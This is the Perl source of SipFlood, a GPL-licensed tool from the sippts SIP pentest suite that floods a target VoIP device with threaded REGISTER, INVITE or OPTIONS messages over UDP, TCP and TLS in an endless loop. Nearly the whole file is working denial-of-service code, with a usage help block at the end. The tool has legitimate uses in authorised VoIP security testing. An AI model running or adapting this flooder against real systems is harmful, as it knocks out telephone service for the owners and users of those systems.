#!/usr/bin/perl
#
# -=-=-=-=
# SipFlood
# -=-=-=-=
#
# Sipflood send messages to a target trying to flood the device
#
# Copyright (C) 2015-2019 Jose Luis Verdeguer <pepeluxx@gmail.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
use warnings;
use strict;
use IO::Socket;
use IO::Socket::Timeout;
use IO::Socket::SSL;
use NetAddr::IP;
use threads;
use threads::shared;
use Getopt::Long;
use Digest::MD5;
use File::Temp qw(tempfile);

my $useragent = 'pplsip';

my $threads = 0;
my @range;
my @results;
 
my $maxthreads = 300;
my $host = ''; # host
my $dport = '5060'; # destination port for UDP and TCP
my $tlsport = '5061'; # destination port for TLS
my $method = 'INVITE'; # method to use (INVITE, REGISTER, OPTIONS)
my $fromuser = '100'; # From User
my $fromname = ''; # From Name
my $touser = '100'; # To User
my $toname = ''; # To Name
my $contactdomain = '1.1.1.1'; # Contact Domain
my $domain = ''; # SIP Domain
my $nolog = 0; # no log
my $proto = '';	# protocol
my $noth = 0; # don't use threads
my $ver = 0; # show version

my $abort = 0;

my $from_ip = '';

STDOUT->autoflush(1);

$SIG{INT} = \&interrupt;

sub init() {
    # check params
    my $result = GetOptions ("h=s" => \$host,
				"m=s" => \$method,
				"fu=s" => \$fromuser,
				"fn=s" => \$fromname,
				"tu=s" => \$touser,
				"tn=s" => \$toname,
				"fu=s" => \$fromuser,
				"cd=s" => \$contactdomain,
				"d=s" => \$domain,
				"r=s" => \$dport,
				"proto=s" => \$proto,
				"nolog+" => \$nolog,
				"ua=s" => \$useragent,
				"noth+" => \$noth,
				"th=s" => \$maxthreads,
				"version+" => \$ver);
 
	check_version() if ($ver eq 1);
	help() if ($host eq "");

	$proto = lc($proto);
	$proto = "all" if ($proto ne "tcp" && $proto ne "udp" && $proto ne "tls");
	$maxthreads = 1 if ($noth eq 1);
	$method = uc($method);
 
	$host = inet_ntoa(inet_aton($host));
 	my @arrow = ("|", "/", "-", "\\");
	my $cont = 0;

	while (1) {
		if ($threads < $maxthreads) {
			my $csec = 1;
			my $sipdomain = $domain;
			$sipdomain = $host if ($domain eq "");

			if ($maxthreads > 1) {
				threads->create(\&flood, $host, $dport, $contactdomain, $fromuser, $fromname, $touser, $toname, $csec, $proto, $sipdomain);
				$threads++;

				$cont++;
				$cont = 0 if ($cont > 3);
			}
			else{
				fllod($host, $dport, $contactdomain, $fromuser, $fromname, $touser, $toname, $csec, $proto, $sipdomain);
			} 
		}
		else {
			# Wait for threads to all finish processing.
			foreach my $thr (threads->list()) {
				$thr->join();
			}

			$threads = 0;
		}
	}

	# Wait for threads to all finish processing.
	foreach my $thr (threads->list()) {
		$thr->join();
	}

	print "\n\n";

	exit;
}

sub interrupt {
	if ($abort eq 0) {
		$abort = 1;
		if ($maxthreads > 1) {
			{lock($threads); $threads=$maxthreads;}

			print "Closing threads. Please wait ...\n";
			sleep(2);
		}

		exit;
	}
	else {
		print "Closing threads. Please wait ...\n\n";
	}
}

sub flood {
	my $to_ip = shift;
	my $dport = shift;
	my $contactdomain = shift;
	my $fromuser = shift;
	my $fromname = shift;
	my $touser = shift;
	my $toname = shift;
	my $csec = shift;
	my $proto = shift;
	my $domain = shift;

	send_register($contactdomain, $to_ip, $dport, $fromuser, $fromname, $csec, "udp", $domain) if ($method eq "REGISTER" && ($proto eq "all" || $proto eq "udp"));
	send_register($contactdomain, $to_ip, $dport, $fromuser, $fromname, $csec, "tcp", $domain) if ($method eq "REGISTER" && ($proto eq "all"  || $proto eq "tcp"));
	send_register($contactdomain, $to_ip, $tlsport, $fromuser, $fromname, $csec, "tls", $domain) if ($method eq "REGISTER" && ($proto eq "all" || $proto eq "tls"));

	send_invite($contactdomain, $to_ip, $dport, $fromuser, $fromname, $touser, $toname, $csec, "udp", $domain) if ($method eq "INVITE" && ($proto eq "all" || $proto eq "udp"));
	send_invite($contactdomain, $to_ip, $dport, $fromuser, $fromname, $touser, $toname, $csec, "tcp", $domain) if ($method eq "INVITE" && ($proto eq "all" || $proto eq "tcp"));
	send_invite($contactdomain, $to_ip, $tlsport, $fromuser, $fromname, $touser, $toname, $csec, "tls", $domain) if ($method eq "INVITE" && ($proto eq "all" || $proto eq "tls"));

	send_options($contactdomain, $to_ip, $dport, $fromuser, $fromname, $csec, "udp", $domain) if ($method eq "OPTIONS" && ($proto eq "all" || $proto eq "udp"));
	send_options($contactdomain, $to_ip, $dport, $fromuser, $fromname, $csec, "tcp", $domain) if ($method eq "OPTIONS" && ($proto eq "all" || $proto eq "tcp"));
	send_options($contactdomain, $to_ip, $tlsport, $fromuser, $fromname, $csec, "tls", $domain) if ($method eq "OPTIONS" && ($proto eq "all" || $proto eq "tls"));
}
 
# Send REGISTER message
sub send_register {
	my $contactdomain = shift;
	my $to_ip = shift;
	my $dport = shift;
	my $fromuser = shift;
	my $fromname = shift;
	my $cseq = shift;
	my $proto = shift;
	my $domain = shift;
	my $response = "";

	my $sc;

	if ($proto ne 'tls') {
		$sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>$proto, PeerAddr=>$to_ip, Timeout => 5);
	} else {
		$sc = new IO::Socket::SSL->new(PeerPort=>$dport, PeerAddr=>$to_ip, Timeout => 5, SSL_verify_mode => SSL_VERIFY_NONE);
	}

	if ($sc) {
		IO::Socket::Timeout->enable_timeouts_on($sc);
		$sc->read_timeout(0.5);
		$sc->enable_timeout;
		my $lport = $sc->sockport();

		my $branch = &generate_random_string(71, 0);
		my $callid = &generate_random_string(32, 1);
	
		my $msg = "REGISTER sip:".$fromuser."@".$domain." SIP/2.0\r\n";
		$msg .= "Via: SIP/2.0/".uc($proto)." $contactdomain:$lport;branch=$branch\r\n";
		$msg .= "From: $fromname <sip:".$fromuser."@".$domain.">;tag=0c26cd11\r\n";
		$msg .= "To: $fromname <sip:".$fromuser."@".$domain.">\r\n";
		$msg .= "Contact: <sip:".$fromuser."@".$contactdomain.":$lport;transport=$proto>\r\n";
		$msg .= "Call-ID: ".$callid."\r\n";
		$msg .= "CSeq: $cseq REGISTER\r\n";
		$msg .= "User-Agent: $useragent\r\n";
		$msg .= "Max-Forwards: 70\r\n";
		$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
		$msg .= "Expires: 10\r\n";
		$msg .= "Content-Length: 0\r\n\r\n";

		my $line = "";

		print $sc $msg;

		use Errno qw(ETIMEDOUT EWOULDBLOCK);
		
		LOOP: {
			while (<$sc>) {
				if ( 0+$! == ETIMEDOUT || 0+$! == EWOULDBLOCK ) {
					return "";
				}

				$line = $_;
			
				if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
					$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
					if ($1) { $response = $1; }
				}

				if ($line =~ /^\r\n/) {
					last LOOP if ($response !~ /^1/);
				}
			}
		}

		$response = "NO RESPONSE" if ($response eq "");

		print "[+] $to_ip:$dport/$proto - Sending REGISTER $fromuser ... $response\n";
	}
	
	return $response;
}

# Send INVITE message
sub send_invite {
	my $contactdomain = shift;
	my $to_ip = shift;
	my $dport = shift;
	my $fromuser = shift;
	my $fromname = shift;
	my $touser = shift;
	my $toname = shift;
	my $cseq = shift;
	my $proto = shift;
	my $domain = shift;
	my $response = "";

	my $sc;

	if ($proto ne 'tls') {
		$sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>$proto, PeerAddr=>$to_ip, Timeout => 5);
	} else {
		$sc = new IO::Socket::SSL->new(PeerPort=>$dport, PeerAddr=>$to_ip, Timeout => 5, SSL_verify_mode => SSL_VERIFY_NONE);
	}

	if ($sc) {
		IO::Socket::Timeout->enable_timeouts_on($sc);
		$sc->read_timeout(0.5);
		$sc->enable_timeout;
		my $lport = $sc->sockport();

		my $branch = &generate_random_string(71, 0);
		my $callid = &generate_random_string(32, 1);
	
		my $msg = "INVITE sip:".$touser."@".$domain." SIP/2.0\r\n";
		$msg .= "Via: SIP/2.0/".uc($proto)." $contactdomain:$lport;branch=$branch\r\n";
		$msg .= "From: $fromname <sip:".$fromuser."@".$domain.">;tag=0c26cd11\r\n";
		$msg .= "To: $toname <sip:".$touser."@".$domain.">\r\n";
		$msg .= "Contact: <sip:".$fromuser."@".$contactdomain.":$lport;transport=$proto>\r\n";
		$msg .= "Supported: replaces, timer, path\r\n";
		$msg .= "P-Early-Media: Supported\r\n";
		$msg .= "Call-ID: $callid\r\n";
		$msg .= "CSeq: $cseq INVITE\r\n";
		$msg .= "User-Agent: $useragent\r\n";
		$msg .= "Max-Forwards: 70\r\n";
		$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
		$msg .= "Content-Type: application/sdp\r\n";

		my $sdp .= "v=0\r\n";
		$sdp .= "o=anonymous 1312841870 1312841870 IN IP4 $from_ip\r\n";
		$sdp .= "s=session\r\n";
		$sdp .= "c=IN IP4 $from_ip\r\n";
		$sdp .= "t=0 0\r\n";
		$sdp .= "m=audio 2362 RTP/AVP 0\r\n";
		$sdp .= "a=rtpmap:18 G729/8000\r\n";
		$sdp .= "a=rtpmap:0 PCMU/8000\r\n";
		$sdp .= "a=rtpmap:8 PCMA/8000\r\n\r\n";

		$msg .= "Content-Length: ".length($sdp)."\r\n\r\n";
		$msg .= $sdp;

		my $line = "";

		print $sc $msg;

		use Errno qw(ETIMEDOUT EWOULDBLOCK);
		
		LOOP: {
			while (<$sc>) {
				if ( 0+$! == ETIMEDOUT || 0+$! == EWOULDBLOCK ) {
					return "";
				}

				$line = $_;
			
				if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
					$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
					if ($1) { $response = $1; }
				}

				if ($line =~ /^\r\n/) {
					last LOOP if ($response !~ /^1/);
				}
			}
		}

		$response = "NO RESPONSE" if ($response eq "");

		print "[+] $to_ip:$dport/$proto - Sending INVITE $fromuser => $touser ... $response\n";
	}
	
	return $response;
}

# Send OPTIONS message
sub send_options {
	my $contactdomain = shift;
	my $to_ip = shift;
	my $dport = shift;
	my $fromuser = shift;
	my $fromname = shift;
	my $cseq = shift;
	my $proto = shift;
	my $domain = shift;
	my $response = "";

	my $sc;

	if ($proto ne 'tls') {
		$sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>$proto, PeerAddr=>$to_ip, Timeout => 5);
	} else {
		$sc = new IO::Socket::SSL->new(PeerPort=>$dport, PeerAddr=>$to_ip, Timeout => 5, SSL_verify_mode => SSL_VERIFY_NONE);
	}

	if ($sc) {
		IO::Socket::Timeout->enable_timeouts_on($sc);
		$sc->read_timeout(0.5);
		$sc->enable_timeout;
		my $lport = $sc->sockport();

		my $branch = &generate_random_string(71, 0);
		my $callid = &generate_random_string(32, 1);
	
		my $msg = "OPTIONS sip:".$fromuser."@".$domain." SIP/2.0\r\n";
		$msg .= "Via: SIP/2.0/".uc($proto)." $contactdomain:$lport;branch=$branch\r\n";
		$msg .= "From: $fromname <sip:".$fromuser."@".$domain.">;tag=0c26cd11\r\n";
		$msg .= "To: $fromname <sip:".$touser."@".$domain.">\r\n";
		$msg .= "Contact: <sip:".$fromuser."@".$contactdomain.":$lport;transport=$proto>\r\n";
		$msg .= "Call-ID: $callid\r\n";
		$msg .= "CSeq: $cseq OPTIONS\r\n";
		$msg .= "User-Agent: $useragent\r\n";
		$msg .= "Max-Forwards: 70\r\n";
		$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
		$msg .= "Content-Length: 0\r\n\r\n";

		my $line = "";

		print $sc $msg;

		use Errno qw(ETIMEDOUT EWOULDBLOCK);
		
		LOOP: {
			while (<$sc>) {
				if ( 0+$! == ETIMEDOUT || 0+$! == EWOULDBLOCK ) {
					return "";
				}
				
				$line = $_;
			
				if ($line =~ /^SIP\/2.0/ && ($response eq "" || $response =~ /^1/)) {
					$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
					if ($1) { $response = $1; }
				}
 
				if ($line =~ /^\r\n/) {
					last LOOP if ($response !~ /^1/);
				}
			}

			last LOOP;
		}

		$response = "NO RESPONSE" if ($response eq "");

		print "[+] $to_ip:$dport/$proto - Sending OPTIONS $fromuser ... $response\n";
	}
	
	return $response;
}

 
sub generate_random_string {
    my $length_of_randomstring = shift;
    my $only_hex = shift;
    my @chars;
 
    if ($only_hex == 0) {
        @chars = ('a'..'z','0'..'9');
    }
    else {
        @chars = ('a'..'f','0'..'9');
    }
    my $random_string;
    foreach (1..$length_of_randomstring) {
        $random_string.=$chars[rand @chars];
    }
    return $random_string;
}
 
sub check_version {
	my $version = '';
	my $versionfile = 'version';
	open(my $fh, '<:encoding(UTF-8)', $versionfile)
	or die "Could not open file '$versionfile' $!";
	
	while (my $row = <$fh>) {
		chomp $row;
		$version = $row;
	}

	my $v = `curl -s https://raw.githubusercontent.com/Pepelux/sippts/master/version`;
	$v =~ s/\n//g;

	if ($v ne $version) {	
		print "The current version ($version) is outdated. There is a new version ($v). Please update:\n";
		print "https://github.com/Pepelux/sippts\n";
	}
	else {
		print "The current version ($version) is latest.\n";
	}

	exit;
}

sub help {
    print qq{
SipFLOOD - by Pepelux <pepeluxx\@gmail.com>
--------
Wiki: https://github.com/Pepelux/sippts/wiki/SIPflood

Usage: perl $0 -h <host> [options]
 
== Options ==
-m <string>      = Method: REGISTER/INVITE/OPTIONS (default: INVITE)
-fu <string>     = From User (by default 100)
-fn <string>     = From Name
-tu <string>     = To User (by default 100)
-tn <string>     = To Name
-cd <string>     = Contact Domain (by default 1.1.1.1)
-d <string>      = Domain (by default: destination IP address)
-r <integer>     = Remote port (default: 5060)
-proto <string>  = Protocol (udp, tcp, tls or all - By default: ALL)
-ua <string>     = Customize the UserAgent
-th <integer>    = Number of threads (by default 300)
-nolog           = Don't show anything on the console
-noth            = Don't use threads
-version         = Show version and search for updates

== Examples ==
\$perl $0 -h 192.168.0.1 -m
\tTo send INVITEs to 192.168.0.1 port 5060
\$perl $0 -h 192.168.0.1 -m OPTIONS
\tTo send OPTIONSs to 192.168.0.1 port 5060
\$perl $0 -h 192.168.0.1 -r 5070
\tTo send custom INVITEs to 192.168.0.1 port 5070
\$perl $0 -h 192.168.0.1 -fn Bob -tn Alice -fu 100 -tu 101 -cd 1.2.3.4 -d sip.mydomain.com

};
 
    exit 1;
}
 
init();
